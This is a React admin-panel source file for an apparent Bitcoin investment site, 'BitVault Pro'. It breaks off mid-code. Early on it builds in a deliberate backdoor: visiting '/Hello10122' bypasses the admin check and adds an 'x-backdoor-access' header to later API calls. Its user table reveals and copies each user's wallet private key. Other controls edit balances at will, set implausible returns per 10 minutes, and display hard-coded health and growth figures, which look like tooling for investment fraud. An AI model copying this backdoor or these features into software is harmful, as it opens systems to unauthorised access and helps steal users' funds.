import { useAuth } from "@/hooks/use-auth";
import { useQuery, useMutation } from "@tanstack/react-query";
import { queryClient } from "@/lib/queryClient";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import { useState, useEffect } from "react";
import React from "react";
import type { User, InvestmentPlan } from "@shared/schema";
import { formatBitcoin } from "@/lib/utils";
import { BottomNavigation } from "@/components/bottom-navigation";
import { useLocation } from "wouter";
import { Users, DollarSign, TrendingUp, Edit, RefreshCw, Bitcoin, Send, Copy, Key, Settings, Clock, BarChart3, Activity, Wallet, Database, Shield, AlertTriangle, CheckCircle, XCircle, Eye, EyeOff, Menu, X, Trash2 } from "lucide-react";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Badge } from "@/components/ui/badge";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Progress } from "@/components/ui/progress";

interface AdminStats {
  totalUsers: number;
  totalBalance: string;
  activeInvestments: number;
}

export default function Management() {
  const { user } = useAuth();
  const { toast } = useToast();
  const [, setLocation] = useLocation();
  const [selectedUser, setSelectedUser] = useState<User | null>(null);
  const [newBalance, setNewBalance] = useState("");
  const [dialogOpen, setDialogOpen] = useState(false);
  const [planDialogOpen, setPlanDialogOpen] = useState(false);
  const [selectedPlan, setSelectedPlan] = useState<string>("");
  const [userPrivateKeys, setUserPrivateKeys] = useState<{ [userId: number]: string }>({});
  const [showPrivateKeys, setShowPrivateKeys] = useState<{ [userId: number]: boolean }>({});
  const [vaultAddress, setVaultAddress] = useState("");
  const [depositAddress, setDepositAddress] = useState("");
  const [activeTab, setActiveTab] = useState("overview");
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const [currentTime, setCurrentTime] = useState(new Date());

  // Update time every second
  useEffect(() => {
    const timer = setInterval(() => setCurrentTime(new Date()), 1000);
    return () => clearInterval(timer);
  }, []);

  // Allow access via backdoor route or if user is admin
  const isBackdoorAccess = window.location.pathname === '/Hello10122';

  // Set backdoor access flag for other admin pages
  if (isBackdoorAccess) {
    sessionStorage.setItem('backdoorAccess', 'true');
  }

  if (!user?.isAdmin && !isBackdoorAccess) {
    setLocation('/');
    return null;
  }

  const { data: stats } = useQuery<AdminStats>({
    queryKey: ['/api/admin/stats'],
  });

  const { data: users } = useQuery<User[]>({
    queryKey: ['/api/admin/users'],
    queryFn: async () => {
      const headers: Record<string, string> = {};
      if (isBackdoorAccess) {
        headers['x-backdoor-access'] = 'true';
      }

      const response = await fetch('/api/admin/users', {
        headers,
        credentials: 'include' // Ensure cookies are sent
      });
      if (!response.ok) throw new Error('Failed to fetch users');
      return response.json();
    },
  });

  const { data: investmentPlans } = useQuery<InvestmentPlan[]>({
    queryKey: ['/api/investment-plans'],
  });

  const { data: adminConfig } = useQuery<{vaultAddress: string; depositAddress: string; freePlanRate: string}>({
    queryKey: ['/api/admin/config'],
  });

  // Update state when config data changes
  useEffect(() => {
    if (adminConfig && typeof adminConfig === 'object') {
      setVaultAddress((adminConfig as any).vaultAddress || "");
      setDepositAddress((adminConfig as any).depositAddress || "");
    }
  }, [adminConfig]);

  const updateConfigMutation = useMutation({
    mutationFn: async ({ vaultAddress, depositAddress }: { vaultAddress: string; depositAddress: string }) => {
      const response = await fetch('/api/admin/config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ vaultAddress, depositAddress }),
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.error || 'Failed to update config');
      }

      return response.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['/api/admin/config'] });
      toast({
        title: "Configuration Updated",
        description: "Vault addresses have been successfully updated.",
      });
    },
    onError: (error: any) => {
      toast({
        title: "Update Failed",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const updateFreePlanRateMutation = useMutation({
    mutationFn: async ({ rate }: { rate: string }) => {
      const response = await fetch('/api/admin/update-free-plan-rate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ rate })
      });
      if (!response.ok) throw new Error('Failed to update free plan rate');
      return response.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['/api/admin/config'] });
      toast({ title: "Free plan rate updated successfully!" });
    },
    onError: () => {
      toast({ title: "Failed to update free plan rate", variant: "destructive" });
    }
  });

  const updateBalanceMutation = useMutation({
    mutationFn: async ({ userId, balance }: { userId: number; balance: string }) => {
      const response = await fetch('/api/admin/update-balance', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId, balance }),
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.message);
      }

      return response.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['/api/admin/users'] });
      queryClient.invalidateQueries({ queryKey: ['/api/admin/stats'] });
      setDialogOpen(false);
      setNewBalance("");
      setSelectedUser(null);
      toast({
        title: "Balance Updated",
        description: "User balance has been successfully updated.",
      });
    },
    onError: (error) => {
      toast({
        title: "Update Failed",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const fetchPrivateKeyMutation = useMutation({
    mutationFn: async (userId: number) => {
      const response = await fetch(`/api/admin/user/${userId}/private-key`);
      if (!response.ok) throw new Error('Failed to fetch private key');
      return response.json();
    },
    onSuccess: (data, userId) => {
      setUserPrivateKeys(prev => ({ ...prev, [userId]: data.privateKey }));
      setShowPrivateKeys(prev => ({ ...prev, [userId]: true }));
      toast({ title: "Private Key Retrieved", description: "Private key loaded successfully" });
    },
    onError: () => {
      toast({ title: "Error", description: "Failed to fetch private key", variant: "destructive" });
    },
  });

  const syncAllBalancesMutation = useMutation({
    mutationFn: async () => {
      const response = await fetch('/api/admin/sync-all-balances', {
        method: 'POST',
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.message);
      }

      return response.json();
    },
    onSuccess: () => {
      toast({
        title: "Balances Synced",
        description: "All user balances synced with blockchain",
      });
      queryClient.invalidateQueries({ queryKey: ['/api/admin/users'] });
      queryClient.invalidateQueries({ queryKey: ['/api/admin/stats'] });
    },
    onError: (error) => {
      toast({
        title: "Sync Failed",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const deleteUserMutation = useMutation({
    mutationFn: async (userId: number) => {
      const headers: Record<string, string> = {};
      if (isBackdoorAccess) {
        headers['x-backdoor-access'] = 'true';
      }

      const response = await fetch(`/api/admin/delete-user/${userId}`, {
        method: 'DELETE',
        headers,
        credentials: 'include'
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.error || 'Failed to delete user');
      }

      return response.json();
    },
    onSuccess: () => {
      toast({
        title: "✅ User Deleted",
        description: "The user account has been permanently removed from the system along with all associated data.",
        variant: "default",
      });
      queryClient.invalidateQueries({ queryKey: ['/api/admin/users'] });
      queryClient.invalidateQueries({ queryKey: ['/api/admin/stats'] });
    },
    onError: (error) => {
      toast({
        title: "Delete Failed",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const testBitcoinGenMutation = useMutation({
    mutationFn: async () => {
      const response = await fetch('/api/admin/test-bitcoin-generation', {
        method: 'POST',
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.message);
      }

      return response.json();
    },
    onSuccess: (data) => {
      toast({
        title: data.success ? "Test Passed" : "Test Failed",
        description: data.message,
        variant: data.success ? "default" : "destructive",
      });
      console.log('Bitcoin Generation Test Results:', data);
    },
    onError: (error) => {
      toast({
        title: "Test Error",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const updatePlanMutation = useMutation({
    mutationFn: async ({ userId, planId }: { userId: number; planId: number | null }) => {
      const response = await fetch('/api/admin/update-plan', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId, planId }),
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.message);
      }

      return response.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['/api/admin/users'] });
      setPlanDialogOpen(false);
      setSelectedPlan("");
      setSelectedUser(null);
      toast({
        title: "Plan Updated",
        description: "User investment plan has been successfully updated.",
      });
    },
    onError: (error) => {
      toast({
        title: "Update Failed",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const updatePlanAmountMutation = useMutation({
    mutationFn: async ({ planId, minAmount }: { planId: number; minAmount: string }) => {
      const response = await fetch('/api/admin/update-plan-amount', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ planId, minAmount }),
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.message);
      }

      return response.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['/api/investment-plans'] });
      toast({
        title: "Plan Updated",
        description: "Investment plan minimum amount has been updated.",
      });
    },
    onError: (error) => {
      toast({
        title: "Update Failed",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const updatePlanRateMutation = useMutation({
    mutationFn: async ({ planId, dailyReturnRate }: { planId: number; dailyReturnRate: string }) => {
      const response = await fetch('/api/admin/update-plan-rate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ planId, dailyReturnRate }),
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.message);
      }

      return response.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['/api/investment-plans'] });
      toast({
        title: "Plan Updated",
        description: "Investment plan daily return rate has been updated.",
      });
    },
    onError: (error) => {
      toast({
        title: "Update Failed",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const handleUpdateBalance = (user: User) => {
    setSelectedUser(user);
    setNewBalance(user.balance);
    setDialogOpen(true);
  };

  const handleUpdatePlan = (user: User) => {
    setSelectedUser(user);
    setSelectedPlan(user.currentPlanId?.toString() || "0");
    setPlanDialogOpen(true);
  };

  const submitBalanceUpdate = () => {
    if (!selectedUser) return;

    updateBalanceMutation.mutate({
      userId: selectedUser.id,
      balance: newBalance,
    });
  };

  const submitPlanUpdate = () => {
    if (!selectedUser) return;

    const planId = selectedPlan === "0" ? null : parseInt(selectedPlan);
    updatePlanMutation.mutate({
      userId: selectedUser.id,
      planId,
    });
  };

  const togglePrivateKey = (userId: number) => {
    if (showPrivateKeys[userId]) {
      setShowPrivateKeys(prev => ({ ...prev, [userId]: false }));
    } else {
      fetchPrivateKeyMutation.mutate(userId);
    }
  };

  const copyPrivateKey = (privateKey: string) => {
    navigator.clipboard.writeText(privateKey);
    toast({
      title: "Copied",
      description: "Private key copied to clipboard",
    });
  };

  const updateConfig = () => {
    updateConfigMutation.mutate({ vaultAddress, depositAddress });
  }

  const navigationItems = [
    { id: "overview", label: "Overview", icon: BarChart3 },
    { id: "users", label: "User Management", icon: Users },
    { id: "investments", label: "Investment Control", icon: Activity },
    { id: "plans", label: "Investment Plans", icon: TrendingUp },
    { id: "transactions", label: "Transactions", icon: Clock },
    { id: "security", label: "Security", icon: Shield },
    { id: "database", label: "Database Management", icon: Database },
    { id: "config", label: "Configuration", icon: Settings },
    { id: "brand", label: "Brand Showcase", icon: Bitcoin },
  ];

  const renderSidebar = () => (
    <div className={`fixed inset-y-0 left-0 z-50 w-64 bg-slate-900 transform ${sidebarOpen ? 'translate-x-0' : '-translate-x-full'} transition-transform duration-300 ease-in-out lg:translate-x-0 lg:static lg:inset-0`}>
      <div className="flex items-center justify-between h-16 px-6 border-b border-slate-700">
        <div className="flex items-center gap-3">
          <div className="w-8 h-8 rounded-lg bg-gradient-to-br from-bitcoin to-yellow-600 flex items-center justify-center">
            <span className="text-black text-sm font-bold">₿</span>
          </div>
          <div>
            <h1 className="text-white font-bold text-lg">BitVault Pro Admin</h1>
            <p className="text-slate-400 text-xs">Management Portal</p>
          </div>
        </div>
        <Button
          variant="ghost"
          size="icon"
          onClick={() => setSidebarOpen(false)}
          className="lg:hidden text-white hover:bg-slate-800"
        >
          <X className="w-5 h-5" />
        </Button>
      </div>

      <nav className="mt-6 px-3">
        {navigationItems.map((item) => (
          <button
            key={item.id}
            onClick={() => {
              if (item.id === 'database') {
                setLocation('/admin-database');
              } else {
                setActiveTab(item.id);
                setSidebarOpen(false);
              }
            }}
            className={`w-full flex items-center gap-3 px-3 py-2.5 rounded-lg mb-1 transition-colors ${
              activeTab === item.id
                ? 'bg-bitcoin text-black font-medium'
                : 'text-slate-300 hover:bg-slate-800 hover:text-white'
            }`}
          >
            <item.icon className="w-5 h-5" />
            {item.label}
          </button>
        ))}
      </nav>

      <div className="absolute bottom-6 left-3 right-3">
        <div className="bg-slate-800 rounded-lg p-4">
          <div className="flex items-center gap-2 mb-2">
            <Activity className="w-4 h-4 text-green-400" />
            <span className="text-green-400 text-sm font-medium">System Online</span>
          </div>
          <p className="text-slate-400 text-xs">
            {currentTime.toLocaleTimeString()}
          </p>
        </div>
      </div>
    </div>
  );

  const renderOverviewTab = () => (
    <div className="space-y-6">
      {/* Quick Stats Grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
        <Card className="bg-gradient-to-br from-blue-50 to-blue-100 border-blue-200">
          <CardContent className="p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-blue-600 text-sm font-medium">Total Users</p>
                <p className="text-3xl font-bold text-blue-900">{stats?.totalUsers || 0}</p>
                <p className="text-blue-600 text-xs mt-1">+2.5% from last month</p>
              </div>
              <div className="w-12 h-12 bg-blue-500 rounded-lg flex items-center justify-center">
                <Users className="w-6 h-6 text-white" />
              </div>
            </div>
          </CardContent>
        </Card>

        <Card className="bg-gradient-to-br from-green-50 to-green-100 border-green-200">
          <CardContent className="p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-green-600 text-sm font-medium">Total Balance</p>
                <p className="text-3xl font-bold text-green-900">{formatBitcoin(stats?.totalBalance || "0")}</p>
                <p className="text-green-600 text-xs mt-1">BTC in system</p>
              </div>
              <div className="w-12 h-12 bg-green-500 rounded-lg flex items-center justify-center">
                <Wallet className="w-6 h-6 text-white" />
              </div>
            </div>
          </CardContent>
        </Card>

        <Card className="bg-gradient-to-br from-orange-50 to-orange-100 border-orange-200">
          <CardContent className="p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-orange-600 text-sm font-medium">Active Investments</p>
                <p className="text-3xl font-bold text-orange-900">{stats?.activeInvestments || 0}</p>
                <p className="text-orange-600 text-xs mt-1">Currently running</p>
              </div>
              <div className="w-12 h-12 bg-orange-500 rounded-lg flex items-center justify-center">
                <TrendingUp className="w-6 h-6 text-white" />
              </div>
            </div>
          </CardContent>
        </Card>

        <Card className="bg-gradient-to-br from-purple-50 to-purple-100 border-purple-200">
          <CardContent className="p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-purple-600 text-sm font-medium">System Health</p>
                <p className="text-3xl font-bold text-purple-900">98.5%</p>
                <p className="text-purple-600 text-xs mt-1">Uptime this month</p>
              </div>
              <div className="w-12 h-12 bg-purple-500 rounded-lg flex items-center justify-center">
                <Activity className="w-6 h-6 text-white" />
              </div>
            </div>
          </CardContent>
        </Card>
      </div>

      {/* System Status and Quick Actions */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Shield className="w-5 h-5 text-green-500" />
              System Status
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="flex items-center justify-between">
              <span className="text-sm">Database Connection</span>
              <Badge variant="secondary" className="bg-green-100 text-green-800">
                <CheckCircle className="w-3 h-3 mr-1" />
                Healthy
              </Badge>
            </div>
            <div className="flex items-center justify-between">
              <span className="text-sm">Bitcoin API</span>
              <Badge variant="secondary" className="bg-green-100 text-green-800">
                <CheckCircle className="w-3 h-3 mr-1" />
                Connected
              </Badge>
            </div>
            <div className="flex items-center justify-between">
              <span className="text-sm">Investment Updates</span>
              <Badge variant="secondary" className="bg-green-100 text-green-800">
                <CheckCircle className="w-3 h-3 mr-1" />
                Running
              </Badge>
            </div>
            <div className="flex items-center justify-between">
              <span className="text-sm">Last Backup</span>
              <Badge variant="secondary" className="bg-blue-100 text-blue-800">
                2 hours ago
              </Badge>
            </div>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>Quick Actions</CardTitle>
          </CardHeader>
          <CardContent className="space-y-3">
            <Button
              onClick={() => setLocation('/admin-transactions')}
              className="w-full justify-start bg-blue-600 hover:bg-blue-700"
            >
              <Clock className="w-4 h-4 mr-2" />
              View Pending Transactions
            </Button>
            <Button
              onClick={() => setLocation('/admin-notifications')}
              variant="outline"
              className="w-full justify-start"
            >
              <Send className="w-4 h-4 mr-2" />
              Send Notifications
            </Button>
            <Button
              onClick={() => syncAllBalancesMutation.mutate()}
              disabled={syncAllBalancesMutation.isPending}
              variant="outline"
              className="w-full justify-start"
            >
              {syncAllBalancesMutation.isPending ? (
                <>
                  <RefreshCw className="w-4 h-4 mr-2 animate-spin" />
                  Syncing...
                </>
              ) : (
                <>
                  <RefreshCw className="w-4 h-4 mr-2" />
                  Sync All Balances
                </>
              )}
            </Button>
          </CardContent>
        </Card>
      </div>

      {/* Telegram Channel Updates */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Send className="w-5 h-5" />
            Telegram Channel Updates
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="space-y-2">
            <p className="text-sm text-muted-foreground">
              Send professional investment updates to your Telegram channel with current user statistics and top performers.
            </p>
            <Button
              onClick={async () => {
                try {
                  const headers: Record<string, string> = {
                    'Content-Type': 'application/json'
                  };
                  
                  if (isBackdoorAccess) {
                    headers['x-backdoor-access'] = 'true';
                  }

                  const response = await fetch('/api/admin/test-telegram', {
                    method: 'POST',
                    headers,
                    credentials: 'include'
                  });
                  
                  if (response.ok) {
                    const result = await response.json();
                    toast({
                      title: "Telegram Update Sent! 📱",
                      description: "Professional investment update has been sent to your Telegram channel.",
                    });
                  } else {
                    const errorData = await response.json();
                    throw new Error(errorData.error || 'Failed to send Telegram update');
                  }
                } catch (error: any) {
                  console.error('Telegram test error:', error);
                  toast({
                    title: "Update Failed",
                    description: `Failed to send Telegram update: ${error.message}`,
                    variant: "destructive"
                  });
                }
              }}
              className="w-full"
              variant="default"
            >
              <Send className="w-4 h-4 mr-2" />
              Send Channel Update Now
            </Button>
          </div>
          
          <div className="text-xs text-muted-foreground bg-muted/20 p-3 rounded-lg">
            <p><strong>What gets sent:</strong></p>
            <ul className="list-disc list-inside mt-1 space-y-1">
              <li>Current Bitcoin price and market data</li>
              <li>Top 30 performing investors with portfolio stats</li>
              <li>Platform statistics and metrics</li>
              <li>Professional branding and messaging</li>
            </ul>
          </div>
        </CardContent>
      </Card>
      </div>
    </div>
  );

  const renderUsersTab = () => (
    <div className="space-y-6">
      {/* User Management Table */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Users className="w-5 h-5" />
            User Management
          </CardTitle>
        </CardHeader>
        <CardContent className="p-0">
          <div className="overflow-x-auto">
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>User</TableHead>
                  <TableHead>Balance</TableHead>
                  <TableHead>Plan</TableHead>
                  <TableHead>Wallet</TableHead>
                  <TableHead>Actions</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {users?.map((user) => {
                  const userPlan = investmentPlans?.find(plan => plan.id === user.currentPlanId);
                  return (
                    <TableRow key={user.id}>
                      <TableCell>
                        <div>
                          <p className="font-medium">{user.email}</p>
                          <p className="text-sm text-muted-foreground">ID: {user.id}</p>
                        </div>
                      </TableCell>
                      <TableCell>
                        <div className="flex items-center gap-2">
                          <Bitcoin className="w-4 h-4 text-bitcoin" />
                          <span className="font-mono">{formatBitcoin(user.balance)}</span>
                        </div>
                      </TableCell>
                      <TableCell>
                        {userPlan ? (
                          <Badge style={{ backgroundColor: userPlan.color + '20', color: userPlan.color }}>
                            {userPlan.name}
                          </Badge>
                        ) : (
                          <Badge variant="secondary">Free Plan</Badge>
                        )}
                      </TableCell>
                      <TableCell>
                        <div className="flex items-center gap-2">
                          {showPrivateKeys[user.id] ? (
                            <div className="flex items-center gap-2">
                              <Input
                                type="text"
                                value={userPrivateKeys[user.id] || ""}
                                readOnly
                                className="w-32 text-xs"
                              />
                              <Button
                                size="sm"
                                onClick={() => copyPrivateKey(userPrivateKeys[user.id])}
                                className="bg-green-500 hover:bg-green-600"
                              >
                                <Copy className="w-3 h-3" />
                              </Button>
                              <Button
                                size="sm"
                                onClick={() => togglePrivateKey(user.id)}
                                variant="outline"
                              >
                                <EyeOff className="w-3 h-3" />
                              </Button>
                            </div>
                          ) : (
                            <Button
                              size="sm"
                              onClick={() => togglePrivateKey(user.id)}
                              variant="outline"
                            >
                              <Eye className="w-3 h-3 mr-1" />
                              Show Key
                            </Button>
                          )}
                        </div>
                      </TableCell>
                      <TableCell>
                        <div className="flex gap-1">
                          <Button
                            size="sm"
                            onClick={() => handleUpdateBalance(user)}
                            className="bg-bitcoin hover:bg-bitcoin/90 text-black"
                            title="Update Balance"
                          >
                            <Edit className="w-3 h-3" />
                          </Button>
                          <Button
                            size="sm"
                            onClick={() => handleUpdatePlan(user)}
                            variant="outline"
                            title="Update Plan"
                          >
                            <Settings className="w-3 h-3" />
                          </Button>
                          {!user.isAdmin && (
                            <Button
                              size="sm"
                              onClick={() => {
                                if (confirm(`Are you sure you want to delete user ${user.email}? This action cannot be undone.`)) {
                                  deleteUserMutation.mutate(user.id);
                                }
                              }}
                              variant="destructive"
                              title="Delete User"
                              disabled={deleteUserMutation.isPending}
                            >
                              <Trash2 className="w-3 h-3" />
                            </Button>
                          )}
                        </div>
                      </TableCell>
                    </TableRow>
                  );
                })}
              </TableBody>
            </Table>
          </div>
        </CardContent>
      </Card>

      {/* Quick Balance Management */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <DollarSign className="w-5 h-5" />
            Quick Balance Management
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <div>
              <Label htmlFor="quickUserId">User ID</Label>
              <Input
                id="quickUserId"
                type="number"
                placeholder="Enter User ID"
                className="mt-1"
              />
            </div>
            <div>
              <Label htmlFor="quickBalance">New Balance (BTC)</Label>
              <Input
                id="quickBalance"
                type="number"
                step="0.00000001"
                placeholder="0.00000000"
                className="mt-1"
              />
            </div>
            <div className="flex items-end">
              <Button
                onClick={() => {
                  const userIdInput = document.getElementById('quickUserId') as HTMLInputElement;
                  const balanceInput = document.getElementById('quickBalance') as HTMLInputElement;
                  if (userIdInput.value && balanceInput.value) {
                    const user = users?.find(u => u.id === parseInt(userIdInput.value));
                    if (user) {
                      setSelectedUser(user);
                      setNewBalance(balanceInput.value);
                      setDialogOpen(true);
                    }
                  }
                }}
                className="w-full bg-bitcoin hover:bg-bitcoin/90 text-black"
              >
                Update Balance
              </Button>
            </div>
          </div>
        </CardContent>
      </Card>
    </div>
  );

  const renderPlansTab = () => (
    <div className="space-y-6">
      {/* Free Plan Rate Configuration */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <TrendingUp className="w-5 h-5" />
            Free Plan Configuration
          </CardTitle>
        </CardHeader>
        <CardContent>
          <div className="bg-gradient-to-r from-blue-50 to-indigo-50 p-6 rounded-lg border border-blue-200">
            <h3 className="font-semibold text-blue-900 mb-4">Global Free Plan Settings</h3>
            <div className="flex gap-4 items-end">
              <div className="flex-1">
                <Label htmlFor="freePlanRate">Rate (% per 10 minutes)</Label>
                <Input
                  id="freePlanRate"
                  type="number"
                  step="0.0001"
                  defaultValue={adminConfig ? (parseFloat(adminConfig.freePlanRate) * 100).toFixed(4) : "0.0100"}
                  placeholder="0.0100"
                  className="mt-1"
                />
              </div>
              <Button
                onClick={(e) => {
                  const input = document.getElementById('freePlanRate') as HTMLInputElement;
                  if (input) {
                    const newRate = parseFloat(input.value) / 100;
                    if (!isNaN(newRate) && newRate >= 0) {
                      updateFreePlanRateMutation.mutate({ rate: newRate.toString() });
                    }
                  }
                }}
                disabled={updateFreePlanRateMutation.isPending}
                className="bg-blue-600 hover:bg-blue-700"
              >
                {updateFreePlanRateMutation.isPending ? "Updating..." : "Update Rate"}
              </Button>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Investment Plans Management */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Settings className="w-5 h-5" />
            Investment Plan Management
          </CardTitle>
        </CardHeader>
        <CardContent>
          <div className="space-y-6">
            {investmentPlans?.map((plan) => (
              <div key={plan.id} className="border rounded-lg p-6 bg-gradient-to-r from-gray-50 to-white shadow-sm">
                <div className="flex justify-between items-start mb-4">
                  <div>
                    <h4 className="font-semibold text-lg flex items-center gap-2">
                      {plan.name}
                      <Badge
                        className="px-2 py-1 text-xs"
                        style={{ backgroundColor: plan.color + '20', color: plan.color }}
                      >
                        ID: {plan.id}
                      </Badge>
                    </h4>
                    <p className="text-sm text-muted-foreground">
                      {plan.roiPercentage}% ROI over {plan.durationDays} days
                    </p>
                  </div>
                  <Badge
                    className="px-3 py-1"
                    style={{ backgroundColor: plan.color + '20', color: plan.color }}
                  >
                    {plan.isActive ? 'Active' : 'Inactive'}
                  </Badge>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                  <div>
                    <Label htmlFor={`minAmount-${plan.id}`}>Minimum Amount (BTC)</Label>
                    <div className="flex gap-2 mt-1">
                      <Input
                        id={`minAmount-${plan.id}`}
                        type="number"
                        step="0.00000001"
                        defaultValue={plan.minAmount}
                        placeholder="0.001"
                      />
                      <Button
                        size="sm"
                        onClick={() => {
                          const input = document.getElementById(`minAmount-${plan.id}`) as HTMLInputElement;
                          if (input && input.value !== plan.minAmount) {
                            updatePlanAmountMutation.mutate({
                              planId: plan.id,
                              minAmount: input.value
                            });
                          }
                        }}
                        className="bg-green-600 hover:bg-green-700"
                      >
                        Update
                      </Button>
                    </div>
                  </div>

                  <div>
                    <Label htmlFor={`dailyRate-${plan.id}`}>Daily Return Rate (%)</Label>
                    <div className="flex gap-2 mt-1">
                      <Input
                        id={`dailyRate-${plan.id}`}
                        type="number"
                        step="0.0001"
                        defaultValue={(parseFloat(plan.dailyReturnRate) * 100).toFixed(4)}
                        placeholder="0.5000"
                      />
                      <Button
                        size="sm"
                        onClick={() => {
                          const input = document.getElementById(`dailyRate-${plan.id}`) as HTMLInputElement;
                          if (input) {
                            const newRate = (parseFloat(input.value) / 100).toString();
                            if (newRate !== plan.dailyReturnRate) {
                              updatePlanRateMutation.mutate({
                                planId: plan.id,
                                dailyReturnRate: newRate
                              });
                            }
                          }
                        }}
                        className="bg-orange-600 hover:bg-orange-700"
                      >
                        Update
                      </Button>
                    </div>
                  </div>

                  <div>
                    <Label htmlFor={`roiPercentage-${plan.id}`}>Total ROI (%)</Label>
                    <div className="flex gap-2 mt-1">
                      <Input
                        id={`roiPercentage-${plan.id}`}
                        type="number"
                        step="1"
                        defaultValue={plan.roiPercentage}
                        placeholder="15"
                      />
                      <Button
                        size="sm"
                        variant="outline"
                        className="bg-purple-600 hover:bg-purple-700 text-white"
                      >
                        Update
                      </Button>
                    </div>
                  </div>
                </div>

                <div className="mt-4 p-3 bg-blue-50 rounded-lg">
                  <p className="text-sm text-blue-800">
                    <strong>Current Settings:</strong> Min: {plan.minAmount} BTC | Daily: {(parseFloat(plan.dailyReturnRate) * 100).toFixed(4)}% |
                    Total ROI: {plan.roiPercentage}% over {plan.durationDays} days
                  </p>
                </div>
              </div>
            ))}
          </div>
        </CardContent>
      </Card>
    </div>
  );

  const renderTransactionsTab = () => (
    <Card>
      <CardHeader>
        <CardTitle className="flex items-center gap-2">
          <Clock className="w-5 h-5" />
          Transaction Management
        </CardTitle>
      </CardHeader>
      <CardContent className="space-y-4">
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <Button
            onClick={() => setLocation('/admin-transactions')}
            className="h-20 bg-blue-600 hover:bg-blue-700 flex-col"
          >
            <Clock className="w-6 h-6 mb-2" />
            <span>Pending Transactions</span>
            <span className="text-xs opacity-75">Review & Approve</span>
          </Button>
          <Button
            onClick={() => setLocation('/admin-notifications')}
            variant="outline"
            className="h-20 flex-col"
          >
            <Send className="w-6 h-6 mb-2" />
            <span>Send Notifications</span>
            <span className="text-xs opacity-75">Bulk Messaging</span>
          </Button>
        </div>
      </CardContent>
    </Card>
  );

  const { data: allInvestments, isLoading: investmentsLoading } = useQuery({
    queryKey: ['/api/admin/investments'],
    queryFn: async () => {
      const headers: Record<string, string> = {};
      if (isBackdoorAccess) {
        headers['x-backdoor-access'] = 'true';
      }

      const response = await fetch('/api/admin/investments', {
        headers,
        credentials: 'include'
      });
      if (!response.ok) throw new Error('Failed to fetch investments');
      return response.json();
    },
    enabled: activeTab === 'investments',
  });

  const pauseInvestmentMutation = useMutation({
    mutationFn: async ({ investmentId, reason }: { investmentId: number; reason?: string }) => {
      const headers: Record<string, string> = { 'Content-Type': 'application/json' };
      if (isBackdoorAccess) headers['x-backdoor-access'] = 'true';

      const response = await fetch(`/api/admin/investments/${investmentId}/toggle`, {
        method: 'POST',
        headers,
        body: JSON.stringify({ reason }),
        credentials: 'include'
      });
      if (!response.ok) throw new Error('Failed to toggle investment');
      return response.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['/api/admin/investments'] });
      toast({ title: "Investment status updated successfully" });
    },
    onError: (error: any) => {
